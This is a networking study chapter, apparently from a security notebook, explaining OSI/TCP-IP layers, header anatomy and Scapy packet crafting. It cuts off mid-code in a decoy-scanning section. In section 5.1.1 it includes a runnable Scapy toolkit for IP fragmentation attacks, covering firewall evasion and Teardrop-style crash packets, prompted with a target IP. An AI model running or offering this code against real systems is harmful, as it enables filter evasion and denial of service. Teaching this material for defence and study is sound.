# Networking Architecture & Models: The Physics of Cyber War

---
title: "Networking Architecture & Models"
parent: "[[02_Networking]]"
tags:
  - network
  - osi
  - tcp-ip
  - architecture
  - deep-dive
  - theory
created: 2026-01-23
updated: 2026-01-24
---

> **Executive Summary**: Networking is not merely a collection of protocols; it is the "physics" of the digital domain. Just as a structural engineer must understand gravity and load distribution, a security professional must possess an intuitive, molecular-level understanding of how data moves, how layers interact, and where the abstractions leak. This chapter deconstructs the OSI and TCP/IP models not as academic exercises, but as battlemaps for Red Team evasion and Blue Team visibility.

---

## Table of Contents
1. [Learning Objectives](#1-learning-objectives)
2. [The Models Revisited: OSI vs. TCP/IP](#2-the-models-revisited-osi-vs-tcpip)
3. [Deep Dive: Encapsulation & Decapsulation](#3-deep-dive-encapsulation--decapsulation)
4. [The Packet Anatomy: Bit-Level Analysis](#4-the-packet-anatomy-bit-level-analysis)
5. [Red Team Perspective: Abusing the Model](#5-red-team-perspective-abusing-the-model)
6. [Blue Team Perspective: Visibility & Controls](#6-blue-team-perspective-visibility--controls)
7. [Practical Lab: Fragmentation & Evasion](#7-practical-lab-fragmentation--evasion)
8. [Advanced Protocol Analysis](#8-advanced-protocol-analysis)
9. [Layer-by-Layer Deep Dive](#9-layer-by-layer-deep-dive)
10. [Advanced Attack Scenarios](#10-advanced-attack-scenarios)
11. [Packet Crafting & Manipulation](#11-packet-crafting--manipulation)
12. [Network Programming Examples](#12-network-programming-examples)
13. [Defense Mechanisms & Detection](#13-defense-mechanisms--detection)
14. [Real-World Case Studies](#14-real-world-case-studies)
15. [Critical Analysis & Checkpoints](#15-critical-analysis--checkpoints)

---

## 1. Learning Objectives

By the end of this deep-dive chapter, you will be able to:

- **Deconstruct Encapsulation**: Visualize and manipulate headers at the bit level to bypass filters.
- **Contrast Models**: Articulate the critical differences between the theoretical OSI model and the practical TCP/IP implementation, specifically where "Layer Violations" occur.
- **Weaponize the Stack**: Map specific attack classes (e.g., Smurfing, Teardrop, Slowloris) to their exact architectural flaws.
- **Analyze Cross-Layer Interaction**: Understand how a Layer 2 attack (ARP Spoofing) fundamentally breaks Layer 3 security (Routing).
- **Design Defensible Architectures**: Apply the principle of "Defense in Depth" based on layer-specific controls.
- **Craft Custom Packets**: Use Scapy, raw sockets, and other tools to create malicious/test packets from scratch.
- **Evade Detection**: Understand signature-based vs. anomaly-based detection and how to circumvent both.
- **Implement Layer-Specific Attacks**: Execute and defend against attacks at each OSI layer.

---

## 2. The Models Revisited: OSI vs. TCP/IP

### 2.1 The Map is Not the Territory

The **OSI Model (Open Systems Interconnection)** is a theoretical reference developed by ISO. It is rigid, beautiful, and largely fictional.
The **TCP/IP Model (Internet Protocol Suite)** is the ragged, practical set of protocols that actually runs the world, developed by DARPA.

**Key Insight for Hackers**: Security vulnerabilities often exist in the *gap* between how the model says things *should* work and how the TCP/IP stack *actually* implements them. For example, the OSI model implies strict separation, but in reality, a Layer 4 TCP header calculates its checksum using a "Pseudo-Header" derived from Layer 3 IP addresses—a blatant layer violation that links transport integrity to network identity.

### 2.2 The 7-Layer OSI Model (The Theoretical Ideal)

| Layer | Name | PDU | Function | Security Relevance & Attack Vectors |
| :--- | :--- | :--- | :--- | :--- |
| **7** | **Application** | Data | Interface for applications to access network services. | **Attacks**: SQL Injection, XSS, Buffer Overflows, Phishing. <br> **Defense**: WAF, Input Validation, CASB. |
| **6** | **Presentation** | Data | Translation, Encryption, Compression. | **Attacks**: Malformed Unicode (Directory Traversal), SSL Stripping, Homoglyphs. <br> **Defense**: Canonicalization, Encoding Enforcement. |
| **5** | **Session** | Data | Session establishment, maintenance, and teardown. | **Attacks**: Session Fixation, Session Hijacking, Token Replay. <br> **Defense**: High Entropy Cookies, Short Timeouts. |
| **4** | **Transport** | Segment/Datagram | End-to-end delivery, Reliability (TCP), Flow Control. | **Attacks**: SYN Floods, Port Scanning, Sequence Prediction. <br> **Defense**: Stateful Firewalls, Random Sequence Numbers. |
| **3** | **Network** | Packet | Routing, Logical Addressing (IP). | **Attacks**: IP Spoofing, Route Injection, Ping of Death. <br> **Defense**: ACLs, Route Filtering, uRPF. |
| **2** | **Data Link** | Frame | Physical Addressing (MAC), Media Access Control. | **Attacks**: ARP Poisoning, MAC Flooding, VLAN Hopping. <br> **Defense**: 802.1X, DAI, Port Security. |
| **1** | **Physical** | Bit | Transmission of raw bitstream over medium. | **Attacks**: Wiretapping, Jamming, Evil Maid. <br> **Defense**: Conduit, Faraday Cages, Physical Access Control. |

## Layer 7 – Application

**Security relevance:**  
This is where users and applications directly interact with the network, so it’s the **most targeted layer**.

**Attack vectors explained:**

- **SQL Injection:** Attacker sends crafted input that gets executed as database commands.
    
- **XSS:** Malicious scripts injected into web pages run in other users’ browsers.
    
- **Buffer Overflows:** Excess input overwrites memory, allowing code execution.
    
- **Phishing:** Tricks users into giving credentials or sensitive data.
    

**Defenses explained:**

- **WAF:** Filters malicious HTTP requests before they hit the app.
    
- **Input Validation:** Ensures user input matches expected format and length.
    
- **CASB:** Enforces security policies for cloud-based apps and data.
    

---

## Layer 6 – Presentation

**Security relevance:**  
Handles **data representation**, encryption, and encoding — mistakes here create sneaky bypasses.

**Attack vectors explained:**

- **Malformed Unicode:** Different encodings represent the same character, bypassing filters.
    
- **SSL Stripping:** Downgrades HTTPS to HTTP to steal data in transit.
    
- **Homoglyph Attacks:** Uses look-alike characters (e.g., Cyrillic “а” vs Latin “a”) to spoof domains.
    

**Defenses explained:**

- **Canonicalization:** Converts data into a single standard form before processing.
    
- **Encoding Enforcement:** Ensures consistent encoding (UTF-8, TLS versions).
    

---

## Layer 5 – Session

**Security relevance:**  
Manages **who is logged in and for how long**, making it critical for authentication security.

**Attack vectors explained:**

- **Session Fixation:** Attacker forces a known session ID onto a victim.
    
- **Session Hijacking:** Steals a valid session token to impersonate a user.
    
- **Token Replay:** Reuses captured authentication tokens.
    

**Defenses explained:**

- **High Entropy Cookies:** Hard-to-guess session IDs.
    
- **Short Timeouts:** Limits damage if a session is stolen.
    

---

## Layer 4 – Transport

**Security relevance:**  
Controls reliable delivery and ports — prime target for **availability attacks**.

**Attack vectors explained:**

- **SYN Floods:** Exhaust server resources by never completing TCP handshakes.
    
- **Port Scanning:** Maps open services for later exploitation.
    
- **Sequence Prediction:** Guessing TCP sequence numbers to inject traffic.
    

**Defenses explained:**

- **Stateful Firewalls:** Track connection states to block abnormal traffic.
    
- **Random Sequence Numbers:** Prevent session hijacking via prediction.
    

---

## Layer 3 – Network

**Security relevance:**  
Handles **routing and IP addressing**, making it vulnerable to spoofing and misdirection.

**Attack vectors explained:**

- **IP Spoofing:** Forging source IP addresses to bypass trust rules.
    
- **Route Injection:** Malicious routing updates redirect traffic.
    
- **Ping of Death:** Oversized packets crash systems.
    

**Defenses explained:**

- **ACLs:** Restrict which IPs can send or receive traffic.
    
- **Route Filtering:** Accept routes only from trusted peers.
    
- **uRPF:** Verifies source IPs are reachable via the correct interface.
    

---

## Layer 2 – Data Link

**Security relevance:**  
Controls **local network trust**, which attackers exploit once inside the LAN.

**Attack vectors explained:**

- **ARP Poisoning:** Redirects traffic by faking MAC-to-IP mappings.
    
- **MAC Flooding:** Overloads switches so they behave like hubs.
    
- **VLAN Hopping:** Gains access to other VLANs.
    

**Defenses explained:**

- **802.1X:** Authenticates devices before network access.
    
- **DAI:** Blocks malicious ARP messages.
    
- **Port Security:** Limits MAC addresses per switch port.
    

---

## Layer 1 – Physical

**Security relevance:**  
If an attacker controls the hardware, **all higher-layer security is meaningless**.

**Attack vectors explained:**

- **Wiretapping:** Physical interception of cables or signals.
    
- **Jamming:** Disrupts wireless communication.
    
- **Evil Maid:** Physical access used to implant malware or hardware backdoors.
    

**Defenses explained:**

- **Conduit:** Secured cable pathways.
    
- **Faraday Cages:** Block electromagnetic interception.
    
- **Physical Access Control:** Locks, badges, cameras.
---
### 2.3 The 4-Layer TCP/IP Model (The Reality)

The TCP/IP model condenses the OSI layers. This condensation is where nuance is lost and bugs are found.

1.  **Application Layer** (Combines OSI 5, 6, 7): HTTP, DNS, SSH.
2.  **Transport Layer** (Matches OSI 4): TCP, UDP.
3.  **Internet Layer** (Matches OSI 3): IP, ICMP, IGMP.
4.  **Link Layer** (Combines OSI 1, 2): Ethernet, Wi-Fi.

### 2.4 Visual Comparison: OSI vs TCP/IP

```
┌─────────────────────────────────────────────────────────────┐
│               OSI MODEL           │      TCP/IP MODEL        │
├───────────────────────────────────┼──────────────────────────┤
│  7. Application Layer             │                          │
│  6. Presentation Layer            │   Application Layer      │
│  5. Session Layer                 │   (HTTP, FTP, SSH, DNS)  │
├───────────────────────────────────┼──────────────────────────┤
│  4. Transport Layer               │   Transport Layer        │
│     (TCP, UDP)                    │   (TCP, UDP)             │
├───────────────────────────────────┼──────────────────────────┤
│  3. Network Layer                 │   Internet Layer         │
│     (IP, ICMP, IGMP)              │   (IP, ICMP, ARP)        │
├───────────────────────────────────┼──────────────────────────┤
│  2. Data Link Layer               │   Network Access Layer   │
│  1. Physical Layer                │   (Ethernet, WiFi)       │
└───────────────────────────────────┴──────────────────────────┘
```

### 2.5 Beginner's Explanation: Understanding Layers

**For Beginners**: Think of network layers like mailing a letter:

- **Physical Layer (1)**: The actual truck/plane that carries the letter
- **Data Link Layer (2)**: The envelope (ظرف) with the street address
- **Network Layer (3)**: The postal system routing between cities
- **Transport Layer (4)**: Certified mail vs. regular mail (reliability)
- **Session/Presentation/Application (5-7)**: The actual letter content, language, and formatting

Each layer adds its own "wrapper" to the data, just like putting a letter in an envelope, then in a box, then on a truck.

---

## 3. Deep Dive: Encapsulation & Decapsulation

### 3.1 The Matryoshka Doll Effect

Encapsulation is the process of wrapping data in headers. As a hacker, you must see a packet not as a single unit, but as a series of nested containers.

**The Chain of Trust**:
- When a Switch receives a frame, it trusts the **MAC Header**. It does not look inside at the IP.
- When a Router receives a packet, it trusts the **IP Header**. It does not look inside at the TCP flags (unless it's a firewall).
- When a Web Server receives a stream, it trusts the **HTTP Header**.

**Attack Vector: Tunneling**
Tunneling is simply encapsulation abuse. If a firewall blocks TCP/80 (Web) but allows ICMP (Ping), we can encapsulate a TCP stream *inside* the data payload of an ICMP packet. The firewall sees "Ping", but the attacker sees "Shell".

### 3.2 Encapsulation Process Step-by-Step

Let's trace a complete HTTP request from Application to Physical layer:

```
Step 1: APPLICATION LAYER
┌──────────────────────────────────────────────┐
│  HTTP Request:                               │
│  GET /index.html HTTP/1.1                    │
│  Host: www.example.com                       │
│  User-Agent: Mozilla/5.0                     │
└──────────────────────────────────────────────┘
                    ↓
Step 2: TRANSPORT LAYER (TCP adds header)
┌─────────────────┬────────────────────────────┐
│  TCP Header:    │  HTTP Request              │
│  SrcPort: 54321 │  GET /index.html...        │
│  DstPort: 80    │                            │
│  Seq: 1000      │                            │
│  Flags: PSH,ACK │                            │
└─────────────────┴────────────────────────────┘
                    ↓
Step 3: NETWORK LAYER (IP adds header)
┌──────────────┬─────────────┬─────────────────┐
│  IP Header:  │ TCP Header  │  HTTP Request   │
│  Src: x.x.x.x│ Port: 54321 │  GET /index...  │
│  Dst: y.y.y.y│ Port: 80    │                 │
│  Protocol: 6 │             │                 │
└──────────────┴─────────────┴─────────────────┘
                    ↓
Step 4: DATA LINK LAYER (Ethernet adds header + trailer)
┌─────────┬──────────┬─────────┬──────────┬─────┐
│ ETH Hdr │ IP Hdr   │ TCP Hdr │ HTTP Req │ FCS │
│ MAC Dst │ IP Dst   │ Ports   │ Data     │ CRC │
│ MAC Src │ IP Src   │ Seq/Ack │          │     │
└─────────┴──────────┴─────────┴──────────┴─────┘
                    ↓
Step 5: PHYSICAL LAYER (Bits on wire)
  01010101010101010101010101010101010...
```

### 3.3 Decapsulation at Receiving End

When the packet arrives at the destination, each layer strips its header:

```
Physical → Data Link → Network → Transport → Application

1. Physical: Receives electrical signals, converts to bits
2. Data Link: Checks FCS (Frame Check Sequence), strips Ethernet header
3. Network: Checks IP checksum, verifies destination IP, strips IP header
4. Transport: Checks TCP checksum, manages connection state, strips TCP header
5. Application: Processes HTTP request
```

### 3.4 Protocol Data Unit (PDU) Names

Understanding PDU names is critical for communication:

| Layer | PDU Name | Example |
|-------|----------|---------|
| Application | Data/Message | HTTP Request |
| Transport | Segment (TCP) / Datagram (UDP) | TCP Segment |
| Network | Packet | IP Packet |
| Data Link | Frame | Ethernet Frame |
| Physical | Bits | Electrical Signals |

### 3.5 Code Example: Viewing Encapsulation with Scapy

```python
#!/usr/bin/env python3
"""
Scapy Example: Visualizing Encapsulation
This script creates a complete packet and shows each layer
"""

from scapy.all import *

# Create a complete HTTP GET request packet
packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
         IP(dst="192.168.1.1") / \
         TCP(dport=80, flags="S") / \
         Raw(load="GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n")

# Display the complete packet structure
print("=" * 60)
print("COMPLETE PACKET STRUCTURE")
print("=" * 60)
packet.show()

print("\n" + "=" * 60)
print("LAYER-BY-LAYER BREAKDOWN")
print("=" * 60)

# Show each layer individually
layers = packet.layers()
for i, layer in enumerate(layers):
    print(f"\nLayer {i+1}: {layer.name}")
    print("-" * 40)
    packet[layer].show()

# Hexdump showing raw bytes
print("\n" + "=" * 60)
print("RAW PACKET BYTES (HEXDUMP)")
print("=" * 60)
hexdump(packet)

# Show packet summary
print("\n" + "=" * 60)
print("PACKET SUMMARY")
print("=" * 60)
print(packet.summary())

# Calculate total packet size
print(f"\nTotal Packet Size: {len(packet)} bytes")
print(f"  Ethernet Header: {len(Ether())} bytes")
print(f"  IP Header: {len(IP())} bytes")
print(f"  TCP Header: {len(TCP())} bytes")
print(f"  Payload: {len(packet[Raw].load) if Raw in packet else 0} bytes")
```

**Output Explanation for Beginners:**
When you run this script, you'll see:
1. The complete packet structure showing all layers
2. Each layer's fields (like IP addresses, ports, flags)
3. The raw bytes in hexadecimal format
4. The size of each header

This helps you understand exactly what data is sent over the network.

---

## 4. The Packet Anatomy: Bit-Level Analysis

Let's dissect a standard HTTP Request Packet moving over Ethernet.

### 4.1 Ethernet Frame Header (14 Bytes)
- `Dest MAC`: 6 Bytes. (The Router's Interface).
- `Src MAC`: 6 Bytes. (The Sender's Interface).
- `Type`: 2 Bytes. (`0x0800` = IPv4).

### 4.2 IP Header (20 Bytes Minimum, 60 Bytes Maximum)

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|  IHL  |Type of Service|          Total Length         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |    Protocol   |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options                    |    Padding    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Field-by-Field Breakdown:**

- **Version (4 bits)**: IPv4 = 4, IPv6 = 6
- **IHL - Internet Header Length (4 bits)**: Number of 32-bit words in header (minimum 5 = 20 bytes)
- **TOS - Type of Service (8 bits)**: QoS/DSCP marking
- **Total Length (16 bits)**: Entire packet size including header and data (max 65,535 bytes)
- **Identification (16 bits)**: Unique identifier for fragmented packets
- **Flags (3 bits)**:
  - Bit 0: Reserved (always 0)
  - Bit 1: DF (Don't Fragment) - Critical for Path MTU Discovery
  - Bit 2: MF (More Fragments) - Indicates more fragments follow
- **Fragment Offset (13 bits)**: Position of fragment in original packet
- **TTL - Time To Live (8 bits)**: Hop limit, decremented by each router
- **Protocol (8 bits)**: Next layer protocol (6=TCP, 17=UDP, 1=ICMP)
- **Header Checksum (16 bits)**: Error detection for header only
- **Source IP (32 bits)**: Sender's IP address
- **Destination IP (32 bits)**: Receiver's IP address
- **Options (variable)**: Rarely used, security implications
- **Padding**: Ensures header is multiple of 32 bits

### 4.3 TCP Header (20-60 Bytes)

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Sequence Number                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Acknowledgment Number                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Data |           |U|A|P|R|S|F|                               |
| Offset| Reserved  |R|C|S|S|Y|I|            Window             |
|       |           |G|K|H|T|N|N|                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Checksum            |         Urgent Pointer        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options                    |    Padding    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             data                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Field-by-Field Breakdown:**

- **Source Port (16 bits)**: Sender's port (ephemeral: 49152-65535)
- **Destination Port (16 bits)**: Receiver's port (well-known: 0-1023)
- **Sequence Number (32 bits)**: Position of first data byte in stream
- **Acknowledgment Number (32 bits)**: Next expected sequence number
- **Data Offset (4 bits)**: TCP header length in 32-bit words
- **Reserved (6 bits)**: For future use (should be 0)
- **Flags (6 bits)**:
  - **URG**: Urgent pointer is valid
  - **ACK**: Acknowledgment field is valid
  - **PSH**: Push function - deliver data immediately
  - **RST**: Reset connection
  - **SYN**: Synchronize sequence numbers
  - **FIN**: Sender finished sending data
- **Window (16 bits)**: Flow control - bytes sender willing to receive
- **Checksum (16 bits)**: Error detection including pseudo-header
- **Urgent Pointer (16 bits)**: Points to urgent data (if URG flag set)
- **Options (variable)**: MSS, Window Scaling, SACK, Timestamps
- **Padding**: Ensures header is multiple of 32 bits

### 4.4 UDP Header (8 Bytes - Much Simpler)

```
 0      7 8     15 16    23 24    31
+--------+--------+--------+--------+
|     Source      |   Destination   |
|      Port       |      Port       |
+--------+--------+--------+--------+
|                 |                 |
|     Length      |    Checksum     |
+--------+--------+--------+--------+
|                                   |
|          data octets ...          |
+-----------------------------------+
```

**For Beginners**: UDP is like sending a postcard vs. TCP which is like certified mail:
- **UDP**: Fast, no confirmation, might get lost (DNS, streaming)
- **TCP**: Slower, confirmed delivery, reliable (HTTP, SSH, FTP)

### 4.5 Complete Packet Example with Real Values

```
Ethernet Frame:
  Destination MAC: 00:1A:2B:3C:4D:5E  (Router)
  Source MAC:      AA:BB:CC:DD:EE:FF  (Your PC)
  EtherType:       0x0800              (IPv4)

IPv4 Header:
  Version:         4
  IHL:             5 (20 bytes)
  DSCP:            0
  Total Length:    60 bytes
  Identification:  54321
  Flags:           DF (Don't Fragment)
  Fragment Offset: 0
  TTL:             64
  Protocol:        6 (TCP)
  Header Checksum: 0xA1B2
  Source IP:       192.168.1.100
  Dest IP:         93.184.216.34 (example.com)

TCP Header:
  Source Port:     54321 (ephemeral)
  Dest Port:       80 (HTTP)
  Sequence:        1000000
  Ack Number:      2000000
  Data Offset:     5 (20 bytes)
  Flags:           SYN
  Window:          65535
  Checksum:        0xC3D4
  Urgent Pointer:  0

Payload:
  (empty for SYN packet)
```

### 4.6 Code Example: Parsing Packet Headers

```python
#!/usr/bin/env python3
"""
Parse and Display Packet Headers
This script reads a pcap file and displays detailed header information
"""

from scapy.all import *

def parse_ethernet(packet):
    """Parse Ethernet header"""
    if Ether in packet:
        eth = packet[Ether]
        print(f"  Destination MAC: {eth.dst}")
        print(f"  Source MAC:      {eth.src}")
        print(f"  EtherType:       {hex(eth.type)}")

def parse_ip(packet):
    """Parse IP header"""
    if IP in packet:
        ip = packet[IP]
        print(f"\nIP Header:")
        print(f"  Version:         {ip.version}")
        print(f"  Header Length:   {ip.ihl} ({ip.ihl * 4} bytes)")
        print(f"  TOS:             {ip.tos}")
        print(f"  Total Length:    {ip.len} bytes")
        print(f"  Identification:  {ip.id}")
        print(f"  Flags:           {ip.flags}")
        print(f"  Fragment Offset: {ip.frag}")
        print(f"  TTL:             {ip.ttl}")
        print(f"  Protocol:        {ip.proto} ({ip.sprintf('%IP.proto%')})")
        print(f"  Checksum:        {hex(ip.chksum)}")
        print(f"  Source IP:       {ip.src}")
        print(f"  Dest IP:         {ip.dst}")

def parse_tcp(packet):
    """Parse TCP header"""
    if TCP in packet:
        tcp = packet[TCP]
        print(f"\nTCP Header:")
        print(f"  Source Port:     {tcp.sport}")
        print(f"  Dest Port:       {tcp.dport}")
        print(f"  Sequence:        {tcp.seq}")
        print(f"  Ack Number:      {tcp.ack}")
        print(f"  Data Offset:     {tcp.dataofs} ({tcp.dataofs * 4} bytes)")
        print(f"  Flags:           {tcp.flags}")
        print(f"  Window:          {tcp.window}")
        print(f"  Checksum:        {hex(tcp.chksum)}")
        print(f"  Urgent Pointer:  {tcp.urgptr}")
        
        # Decode flags
        flags = []
        if tcp.flags.F: flags.append("FIN")
        if tcp.flags.S: flags.append("SYN")
        if tcp.flags.R: flags.append("RST")
        if tcp.flags.P: flags.append("PSH")
        if tcp.flags.A: flags.append("ACK")
        if tcp.flags.U: flags.append("URG")
        print(f"  Flags Decoded:   {', '.join(flags) if flags else 'None'}")

def parse_udp(packet):
    """Parse UDP header"""
    if UDP in packet:
        udp = packet[UDP]
        print(f"\nUDP Header:")
        print(f"  Source Port:     {udp.sport}")
        print(f"  Dest Port:       {udp.dport}")
        print(f"  Length:          {udp.len} bytes")
        print(f"  Checksum:        {hex(udp.chksum)}")

def analyze_packet(packet, packet_num):
    """Analyze a single packet"""
    print(f"\n{'='*60}")
    print(f"PACKET #{packet_num}")
    print(f"{'='*60}")
    print(f"\nEthernet Header:")
    parse_ethernet(packet)
    parse_ip(packet)
    parse_tcp(packet)
    parse_udp(packet)
    
    if Raw in packet:
        print(f"\nPayload:")
        print(f"  Length: {len(packet[Raw].load)} bytes")
        print(f"  First 100 bytes: {packet[Raw].load[:100]}")

# Example usage
if __name__ == "__main__":
    # Create a sample packet
    packet = Ether()/IP(dst="192.168.1.1")/TCP(dport=80, flags="S")
    analyze_packet(packet, 1)
    
    # Or read from pcap file
    # packets = rdpcap("capture.pcap")
    # for i, pkt in enumerate(packets[:5], 1):
    #     analyze_packet(pkt, i)
```

---

## 5. Red Team Perspective: Abusing the Model

### 5.1 Fragmentation Attacks (Layer 3 Abuse)

**Concept**: Firewalls often inspect packet headers to make decisions. If we split a malicious payload (like a shellcode) across two IP fragments, the firewall might inspect the first fragment (which looks innocent) and the second fragment (which also looks innocent in isolation).

**Technique**:
- **Tiny Fragment Attack**: Creating fragments so small that the TCP header is pushed into the second fragment.
- **Overlapping Fragment Attack (Teardrop)**: Creating fragments with invalid offsets that overlap, causing the OS to crash when reassembling.

#### 5.1.1 Fragmentation Attack Code Example

```python
#!/usr/bin/env python3
"""
IP Fragmentation Attack Examples
WARNING: For educational purposes only in authorized environments
"""

from scapy.all import *
import sys

def tiny_fragment_attack(target_ip, target_port):
    """
    Tiny Fragment Attack
    Creates fragments so small that TCP header spans multiple fragments
    This can bypass simple firewalls that only inspect first fragment
    """
    print(f"[*] Launching Tiny Fragment Attack against {target_ip}:{target_port}")
    
    # Create a normal TCP SYN packet
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, flags="S")
    payload = "A" * 100
    
    # Fragment the packet into tiny 8-byte chunks
    # This pushes TCP header into second fragment
    fragments = fragment(ip/tcp/payload, fragsize=8)
    
    print(f"[*] Created {len(fragments)} fragments")
    for i, frag in enumerate(fragments):
        print(f"    Fragment {i+1}: {len(frag)} bytes, MF={frag[IP].flags.MF}, Offset={frag[IP].frag}")
        send(frag, verbose=0)
        time.sleep(0.1)
    
    print("[+] Attack complete")

def overlapping_fragment_attack(target_ip):
    """
    Overlapping Fragment Attack (Teardrop-style)
    Creates overlapping fragments with invalid offsets
    Can crash vulnerable TCP/IP stacks
    """
    print(f"[*] Launching Overlapping Fragment Attack against {target_ip}")
    
    # First fragment
    frag1 = IP(dst=target_ip, id=42, flags="MF", frag=0)
    frag1 /= UDP(dport=7, sport=7)
    frag1 /= "A" * 8
    
    # Second fragment with overlapping offset
    # Offset 2 means it starts at byte 16 (2*8)
    # But first fragment was only 8 bytes of data
    # This creates an overlap
    frag2 = IP(dst=target_ip, id=42, flags=0, frag=2)
    frag2 /= "B" * 8
    
    print(f"[*] Fragment 1: Offset={frag1[IP].frag}, MF={frag1[IP].flags.MF}")
    print(f"[*] Fragment 2: Offset={frag2[IP].frag}, MF={frag2[IP].flags.MF}")
    print(f"[!] Overlap created between fragments")
    
    send(frag1, verbose=0)
    time.sleep(0.1)
    send(frag2, verbose=0)
    
    print("[+] Attack complete")

def fragment_offset_attack(target_ip):
    """
    Fragment Offset Manipulation
    Sends fragments in wrong order with specific offsets
    """
    print(f"[*] Launching Fragment Offset Attack against {target_ip}")
    
    # Create fragments manually with specific offsets
    base_ip = IP(dst=target_ip, id=123)
    
    # Fragment 3 (offset 16 bytes = 2*8)
    frag3 = base_ip.copy()
    frag3.flags = 0  # Last fragment
    frag3.frag = 2
    frag3 /= "THIRD_FRAGMENT"
    
    # Fragment 1 (offset 0)
    frag1 = base_ip.copy()
    frag1.flags = "MF"
    frag1.frag = 0
    frag1 /= ICMP()/"FIRST_FRAGMENT"
    
    # Fragment 2 (offset 8 bytes = 1*8)
    frag2 = base_ip.copy()
    frag2.flags = "MF"
    frag2.frag = 1
    frag2 /= "SECOND_FRAG"
    
    # Send in wrong order: 3, 1, 2
    print("[*] Sending fragments out of order: 3, 1, 2")
    send(frag3, verbose=0)
    time.sleep(0.1)
    send(frag1, verbose=0)
    time.sleep(0.1)
    send(frag2, verbose=0)
    
    print("[+] Attack complete")

def nmap_fragmentation_scan(target_ip, target_port):
    """
    Demonstrates Nmap-style fragmentation scanning
    """
    print(f"[*] Nmap-style Fragmentation Scan: {target_ip}:{target_port}")
    
    # Create SYN packet
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
    
    # Fragment into 8-byte chunks (like nmap -f)
    fragments = fragment(packet, fragsize=8)
    
    print(f"[*] Packet fragmented into {len(fragments)} pieces")
    
    # Send all fragments
    for frag in fragments:
        send(frag, verbose=0)
    
    # Listen for response
    response = sr1(fragments[-1], timeout=2, verbose=0)
    
    if response:
        if response.haslayer(TCP):
            if response[TCP].flags == "SA":  # SYN-ACK
                print(f"[+] Port {target_port} is OPEN")
            elif response[TCP].flags == "RA":  # RST-ACK
                print(f"[-] Port {target_port} is CLOSED")
    else:
        print(f"[?] Port {target_port} is FILTERED or no response")

# Example menu
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════╗
║        IP FRAGMENTATION ATTACK TOOLKIT                  ║
║        WARNING: Educational Purposes Only!               ║
╚══════════════════════════════════════════════════════════╝

1. Tiny Fragment Attack
2. Overlapping Fragment Attack (Teardrop-style)
3. Fragment Offset Manipulation
4. Nmap-style Fragmentation Scan
5. Exit
    """)
    
    choice = input("[?] Select attack (1-5): ")
    
    if choice == "1":
        target = input("[?] Target IP: ")
        port = int(input("[?] Target Port: "))
        tiny_fragment_attack(target, port)
    
    elif choice == "2":
        target = input("[?] Target IP: ")
        overlapping_fragment_attack(target)
    
    elif choice == "3":
        target = input("[?] Target IP: ")
        fragment_offset_attack(target)
    
    elif choice == "4":
        target = input("[?] Target IP: ")
        port = int(input("[?] Target Port: "))
        nmap_fragmentation_scan(target, port)
    
    else:
        print("[*] Exiting...")
```

**For Beginners - How Fragmentation Works:**

Imagine you want to send a large package that doesn't fit in a single box:

1. **Normal packet**: One large box with your stuff
2. **Fragmented packet**: Split into 3 small boxes
   - Box 1: Contains first part + label "Box 1 of 3"
   - Box 2: Contains middle part + label "Box 2 of 3"
   - Box 3: Contains last part + label "Box 3 of 3"

The receiving computer reassembles all boxes in order. But attackers can:
- Send boxes out of order (confuse the receiver)
- Make boxes overlap (box 2 starts before box 1 ends)
- Make boxes too tiny (split the instruction manual across boxes)

### 5.2 Decoy Scanning (Layer 3/4 Abuse)

**Concept**: `nmap -D RND:10 target`
The attacker sends a packet from their IP, plus 10 packets with spoofed Source IPs.
The victim sees 11 packets. 10 are fake. 1 is real.

**Why it works**: The IP stack accepts packets from "anyone". The victim replies to all 11 IPs. The attacker sees the reply to their real IP. The decoys drop the unexpected replies. The Blue Team sees a "Distributed Scan" and can't easily attribute it.

#### 5.2.1 Decoy Scanning Implementation

```python
#!/usr/bin/env python3
"""
Decoy Scanning Implementation
